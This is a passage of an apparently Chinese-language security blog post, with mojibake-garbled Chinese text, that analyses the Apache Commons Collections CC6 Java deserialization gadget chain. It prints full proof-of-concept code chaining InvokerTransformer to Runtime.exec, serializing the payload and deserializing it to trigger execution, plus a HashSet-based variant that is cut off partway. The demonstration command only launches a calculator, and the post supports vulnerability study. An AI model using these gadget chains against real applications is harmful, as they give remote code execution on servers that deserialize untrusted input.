    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>

        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>

        <span class="token comment">//å†™ä¸€ä¸ªfakeçš„trasnformers</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//è¿™æ˜¯çœŸçš„transformer</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>
        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è®©TiedMapEntryé‡Œçš„mapä¸ºlazyMap,keyéšæ„</span>
        <span class="token class-name">Map</span> serMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        serMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        lazyMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"leihehe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/* æŠŠæœ‰ç”¨çš„transformeræ¢å›æ¥ */</span>
        <span class="token class-name">Field</span> myTransformers <span class="token operator">=</span> chainedTransformer<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myTransformers<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        myTransformers<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//åºåˆ—åŒ–</span>
        <span class="token class-name">FileOutputStream</span> fileOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fileOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>serMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åºåˆ—åŒ–</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        fileOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*
         * æœåŠ¡ç«¯ååºåˆ—åŒ–è¯»å–ï¼Œå¹¶è§¦å‘æ¼æ´
         * */</span>
        <span class="token comment">//ååºåˆ—åŒ–</span>
        <span class="token class-name">FileInputStream</span> fileInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"lz.cer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileInputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åªéœ€è¦readObject()å°±ä¼šè§¦å‘æ¼æ´</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204184034975.png" alt="image-20211204184034975" loading="lazy"></p>
<h4 id="è°ƒç”¨hash-å¤„äºŒï¼ˆæ–¹æ³•äºŒï¼‰ï¼š"><a href="#è°ƒç”¨hash-å¤„äºŒï¼ˆæ–¹æ³•äºŒï¼‰ï¼š" class="headerlink" title="è°ƒç”¨hash()å¤„äºŒï¼ˆæ–¹æ³•äºŒï¼‰ï¼š"></a>è°ƒç”¨hash()å¤„äºŒï¼ˆæ–¹æ³•äºŒï¼‰ï¼š</h4><h5 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h5><p>ç»è¿‡åˆ†æï¼Œæˆ‘ä»¬å‘ç°<code>HashMap.put()</code>æ–¹æ³•ä¹Ÿä¼šå¯¼è‡´åˆ©ç”¨é“¾è§¦å‘ï¼ˆä¹Ÿæ­£æ˜¯å®ƒç»™æˆ‘ä»¬åœ¨æ–¹æ³•ä¸€çš„å®ç°ä¸­å¸¦æ¥äº†å‘ï¼‰</p>
<p>é‚£ä¹ˆæˆ‘ä»¬æœ‰æ²¡æœ‰ä»€ä¹ˆåŠæ³•ç›´æ¥è®©ç¨‹åºcallåˆ°<code>HashMap.put()</code>ï¼Œå°±è®©å®ƒæˆä¸ºåˆ©ç”¨é“¾ä¸­ä¸€éƒ¨åˆ†å‘¢ï¼Ÿ</p>
<p><code>HashSet</code>æˆä¸ºäº†æˆ‘ä»¬çš„é¦–é€‰ã€‚</p>
<h5 id="HashSet-readObject"><a href="#HashSet-readObject" class="headerlink" title="HashSet.readObject()"></a>HashSet.readObject()</h5><p>æˆ‘ä»¬å‘ç°<code>HashSet.readObject()</code>ä¸­call åˆ°äº†put()æ–¹æ³•</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> s<span class="token punctuation">)</span>
    <span class="token keyword">throws</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Read in any hidden serialization magic</span>
    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Read in HashMap capacity and load factor and create backing HashMap</span>
    <span class="token keyword">int</span> capacity <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> loadFactor <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readFloat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token comment">/* æ­¤å¤„åˆ¤æ–­æ˜¯å¦ä¸ºLinkedHashSetç±»å‹ï¼Œå¦‚æœä¸æ˜¯å°±åˆ›å»ºHashMap */</span>
    map <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">HashSet</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">LinkedHashSet</span> <span class="token operator">?</span>
           <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>capacity<span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span> <span class="token operator">:</span>
           <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>capacity<span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Read in size</span>
    <span class="token keyword">int</span> size <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Read in all elements in the proper order.</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">E</span> e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> PRESENT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œcallåˆ°äº†put</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœæˆ‘ä»¬èƒ½è®©<code>map</code>å˜é‡ä¸ºæˆ‘ä»¬çš„HashMapå°±èƒ½è¿ä¸Šäº†ã€‚æˆ‘ä»¬å‘ç°åœ¨è¯¥æ–¹æ³•ä¸‹ä¼šé‡å»ºä¸€ä¸ªæ–°çš„mapï¼Œè€Œè¿™ä¸ªmapå°±æ˜¯<strong>HashMap</strong>ç±»å‹ã€‚ å¦‚æœæˆ‘ä»¬ç›´æ¥æŠŠè¿™ä¸ªå†…éƒ¨çš„<strong>HashMap</strong>æ‹¿æ¥ç”¨ï¼ŒæŠŠè¿™ä¸ªå†…éƒ¨çš„<strong>HashMap</strong>çš„keyå€¼æ”¹ä¸º<strong>tiedMapEntry</strong>ï¼Œå½“ä»–è¢«call <code>put()</code>çš„æ—¶å€™ï¼Œåˆ©ç”¨é“¾å°±èƒ½è¢«æˆåŠŸæ‰§è¡Œäº†ã€‚</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211205094232431.png" alt="image-20211205094232431" loading="lazy"></p>
<p>æˆ‘ä»¬è·Ÿåˆ°<code>HashSet.readObject()</code>çœ‹ä¸€ä¸‹ï¼Œçœ‹çœ‹è¿™ä¸ª<code>e</code>æ˜¯æ€ä¹ˆæ¥çš„</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">writeObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectOutputStream</span> s<span class="token punctuation">)</span>
    <span class="token keyword">throws</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Write out any hidden serialization magic</span>
    s<span class="token punctuation">.</span><span class="token function">defaultWriteObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Write out HashMap capacity and load factor</span>
    s<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    s<span class="token punctuation">.</span><span class="token function">writeFloat</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">loadFactor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Write out size</span>
    s<span class="token punctuation">.</span><span class="token function">writeInt</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Write out all elements in the proper order.</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">E</span> e <span class="token operator">:</span> map<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//eæ˜¯é€šè¿‡hashmapçš„keySetæ¥çš„</span>
        s<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//eè¢«åºåˆ—åŒ–äº†</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™å°±å¾ˆæ˜æ˜¾äº†ï¼Œå®ƒä¼šæŠŠå˜é‡<code>map</code>é‡Œçš„<code>key-value</code>å¯¹ç»™åºåˆ—åŒ–ï¼Œå¦‚æœæˆ‘ä»¬å˜é‡<code>map</code>å·²ç»æœ‰å€¼ï¼Œé‚£ä¹ˆå®ƒçš„å†…å®¹å°±ä¼šè¢«åºåˆ—åŒ– -ã€‹ä»è€Œåœ¨readObject()ååºåˆ—åŒ–çš„æ—¶å€™è¿™äº›å†…å®¹åˆä¼šè¢«ååºåˆ—åŒ–ä»è€Œè§¦å‘æ¼æ´ -ã€‹ è¿™é‡Œå¼•å‡ºåé¢çš„ç”¨åå°„ä¿®æ”¹<code>map</code>ã€‚</p>
<h5 id="HashSet-add"><a href="#HashSet-add" class="headerlink" title="HashSet.add()"></a>HashSet.add()</h5><p><code>HashSet.add()</code>ä¼šå‘map(hashmap)ä¸­æ·»åŠ ä¸€ä¸ªkey</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> PRESENT<span class="token punctuation">)</span><span class="token operator">==</span><span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h5 id="POCæ„é€ -1"><a href="#POCæ„é€ -1" class="headerlink" title="POCæ„é€ "></a>POCæ„é€ </h5><p>æˆ‘ä»¬å·²ç»å¾—çŸ¥ï¼ŒHashSetä¸­ä¼šç”Ÿæˆä¸€ä¸ªHashMapï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸å†éœ€è¦è‡ªå·±æ„é€ äº†HashMapäº†ã€‚æˆ‘ä»¬çš„æ€è·¯å¦‚ä¸‹ï¼šå…ˆç”¨hashSetç”Ÿæˆä¸€ä¸ªå¸¦ä»»æ„keyå€¼çš„hashMapï¼Œæˆ‘ä»¬ç”¨åå°„çš„æ–¹å¼å¾—åˆ°è¿™ä¸ªmapï¼Œæœ€åå†ç”¨åå°„çš„æ–¹å¼ä»è¿™ä¸ª<strong>map</strong>ä¸­ä¿®æ”¹<strong>key</strong>ã€‚</p>
<p>åœ¨HashMapä¸­ï¼Œé”®å€¼å¯¹æ˜¯è¢«å­˜å‚¨åœ¨<code>table</code>å˜é‡ä¸­çš„ï¼Œè¿™ä¸ªçœ‹ä»£ç ç›´æ¥èƒ½çœ‹å‡ºæ¥ã€‚</p>
<p><strong>å®Œæ•´POCå¦‚ä¸‹</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections6Method2</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span> <span class="token punctuation">&#123;</span>

        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>

        <span class="token comment">//è¿™æ˜¯çœŸçš„transformer</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
